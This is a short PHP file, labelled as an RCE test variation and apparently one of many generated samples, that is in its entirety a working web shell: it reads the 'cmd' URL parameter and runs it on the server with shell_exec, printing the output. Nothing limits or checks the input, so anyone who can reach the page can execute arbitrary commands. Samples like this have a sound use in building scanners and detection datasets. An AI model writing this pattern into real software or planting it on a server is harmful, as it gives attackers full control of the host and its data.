<?php
// RCE test variation #1439
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>